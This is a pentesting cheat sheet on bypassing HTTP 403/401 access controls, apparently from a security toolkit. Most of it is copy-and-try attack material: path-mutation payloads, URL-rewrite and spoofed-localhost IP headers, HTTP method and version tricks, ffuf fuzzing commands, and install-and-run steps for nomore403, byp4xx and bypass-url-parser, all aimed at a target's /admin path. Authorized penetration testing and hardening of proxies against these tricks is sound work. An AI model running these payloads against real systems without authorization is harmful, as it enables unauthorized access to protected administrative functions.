entries.title: When and how 403/401 is bypassed
entries.body:
403/401 is often enforced NOT where the request is processed: on a reverse proxy / WAF / load balancer, while the backend normalizes the path differently. That is exactly what the bypass relies on.

Classes of techniques:
1. Path mutations — the proxy sees "/admin" and blocks it, while the backend resolves "/admin/.", "/admin..;/", "/%2e/admin" to the same resource.
2. Override headers — the proxy trusts X-Original-URL / X-Rewrite-URL (routing by them) or IP headers (X-Forwarded-For: 127.0.0.1) for "internal-only" endpoints.
3. Method/version change — the ACL is set only on GET, while POST/HEAD/an arbitrary method goes through.
4. Case and extension — /ADMIN, /admin.json, /admin;.

How to test: take a protected path (returns 403), run mutations and headers through it, WATCH for a change in the response code/size (ffuf -mc all -ac). Not every 403 can be broken: a genuine server-side ACL or a client-side redirect cannot be bypassed this way.

entries.title: Top techniques (using /admin as an example) — copy and try
Auto-fuzzing mutations with ffuf
entries.body:
# Full mutation lists are already in this toolkit (⌘K): 403_url_payloads.txt (236 of them),
# and in SecLists: /usr/share/seclists/Fuzzing/403/403.md (77 from @jhaddix).

# mutation at the tail of the path
ffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac
# mutation at the start of the path
ffuf -w 403_url_payloads.txt -u https://target/FUZZadmin -mc all -ac

# -ac auto-calibrates the baseline, -mc all shows all codes — look for a response with a code/size
# different from the original 403 (often 200/302/401).

entries.title: URL-rewrite headers — access to a hidden path
entries.body:
GET / HTTP/1.1
Host: target
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Original-Url: /admin
Request-URI: /admin
Referer: https://target/admin

entries.title: How X-Original-URL / X-Rewrite-URL work
entries.body:
The request goes to an allowed path (for example "/"), but the front-end (Symfony, some Nginx/IIS configs, a number of proxies) routes by the value of the X-Original-URL / X-Rewrite-URL header. The proxy ACL checked "/" (allowed) -> let it through, and the application served /admin.
Send one header at a time, the path in the value — WITHOUT the host, starting with a slash. Compare the response with a direct request to /admin (403).

entries.title: IP headers — bypassing "localhost / internal only"
entries.body:
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Host: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1

# The full list of 42 headers is in the toolkit (⌘K): 403_header_payloads.txt.
# Fuzzing: ffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H "FUZZ" -mc all -ac

entries.title: Changing the HTTP method and version
entries.body:
# The ACL is often set only on GET — try other methods
for m in POST HEAD OPTIONS PUT PATCH TRACE DELETE; do
  printf "%-7s " $m
  curl -s -o /dev/null -w "%{http_code}\n" -X $m https://target/admin
done

# An arbitrary/junk method (some servers treat it as GET)
curl -s -X FOO https://target/admin

# Method override headers
#   X-HTTP-Method-Override: GET
#   X-HTTP-Method: GET
#   X-Method-Override: GET

# Downgrade the protocol version (Host-based routing/ACL may break)
curl -s --http1.0 https://target/admin

entries.title: Automating the 403 bypass
entries.body:
# nomore403 (Go) — paths + methods + headers automatically
go install github.com/devploit/nomore403@latest
nomore403 -u https://target/admin

# byp4xx — verbs / headers / path-mutations in one run
git clone https://github.com/lobuhi/byp4xx && cd byp4xx
./byp4xx.sh https://target/admin

# bypass-url-parser (laluka) — maximum URL mutations
pipx install bypass-url-parser
bypass-url-parser -u "https://target/admin"

# ffuf with the toolkit's ready-made lists (⌘K: 403_url_payloads.txt / 403_header_payloads.txt)
ffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac
ffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H "FUZZ" -mc all -ac

# On stock Kali only ffuf/dirsearch of these are installed — byp4xx/nomore403 are installed as above.
# Burp: the "403 Bypasser" / "Bypass-403" extensions (BApp Store).

entries.title: Signs of a bypass and nuances
entries.body:
• Success = a response with a code/size different from the reference 403 (usually 200/302/401, or a different Content-Length).
• Combine: path + header + method at once (a combination often works, not a single one).
• If the 403 is from a WAF (Cloudflare/Akamai/Imperva in the Server/headers) — that is a different story (WAF bypass), not a backend ACL.
• Hit the backend/origin IP or an internal port directly, bypassing the proxy, if the address is known.
• Try both /path and /path/ — behavior is often different.
• Double encoding (%252e, %252f) goes through where single encoding is cut by the proxy.
• 401 (not 403) — is sometimes bypassed with default/basic creds or the same IP header.
